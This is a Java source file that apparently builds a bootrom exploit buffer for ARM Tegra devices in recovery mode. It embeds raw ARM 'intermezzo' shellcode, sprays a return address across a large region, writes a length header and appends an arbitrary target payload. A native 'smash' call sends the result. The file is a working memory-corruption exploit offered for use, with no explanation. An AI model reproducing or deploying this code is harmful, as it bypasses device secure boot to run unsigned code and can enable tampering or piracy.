package com.loader;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class payload {

    static {
        System.loadLibrary("loader");
    }

    public static native int smash(int fd, int length);

    public static byte[] build(byte[] target) {
        byte[] intermezzo = new byte[] {
            (byte)0x44, (byte)0x00, (byte)0x9F, (byte)0xE5, (byte)0x01, (byte)0x11, (byte)0xA0, (byte)0xE3, 
            (byte)0x40, (byte)0x20, (byte)0x9F, (byte)0xE5, (byte)0x00, (byte)0x20, (byte)0x42, (byte)0xE0, 
            (byte)0x08, (byte)0x00, (byte)0x00, (byte)0xEB, (byte)0x01, (byte)0x01, (byte)0xA0, (byte)0xE3, 
            (byte)0x10, (byte)0xFF, (byte)0x2F, (byte)0xE1, (byte)0x00, (byte)0x00, (byte)0xA0, (byte)0xE1, 
            (byte)0x2C, (byte)0x00, (byte)0x9F, (byte)0xE5, (byte)0x2C, (byte)0x10, (byte)0x9F, (byte)0xE5, 
            (byte)0x02, (byte)0x28, (byte)0xA0, (byte)0xE3, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0xEB, 
            (byte)0x20, (byte)0x00, (byte)0x9F, (byte)0xE5, (byte)0x10, (byte)0xFF, (byte)0x2F, (byte)0xE1, 
            (byte)0x04, (byte)0x30, (byte)0x90, (byte)0xE4, (byte)0x04, (byte)0x30, (byte)0x81, (byte)0xE4, 
            (byte)0x04, (byte)0x20, (byte)0x52, (byte)0xE2, (byte)0xFB, (byte)0xFF, (byte)0xFF, (byte)0x1A, 
            (byte)0x1E, (byte)0xFF, (byte)0x2F, (byte)0xE1, (byte)0x20, (byte)0xF0, (byte)0x01, (byte)0x40, 
            (byte)0x5C, (byte)0xF0, (byte)0x01, (byte)0x40, (byte)0x00, (byte)0x00, (byte)0x02, (byte)0x40, 
            (byte)0x00, (byte)0x00, (byte)0x01, (byte)0x40
        };

        int spray = 0x3C00;
        int start = 0x2A8;
        int base = start + (spray * 4);
        int length = base + 0x1000 + target.length;
        int padding = (0x1000 - (length % 0x1000)) % 0x1000;
        int total = length + padding;

        byte[] buffer = new byte[total];
        ByteBuffer wrap = ByteBuffer.wrap(buffer);
        wrap.order(ByteOrder.LITTLE_ENDIAN);

        wrap.putInt(0, 0x30298);

        int address = 0x4001F000;
        for (int i = 0; i < spray; i++) {
            wrap.putInt(start + (i * 4), address);
        }

        System.arraycopy(intermezzo, 0, buffer, base, intermezzo.length);
        System.arraycopy(target, 0, buffer, base + 0x1000, target.length);

        return buffer;
    }
}
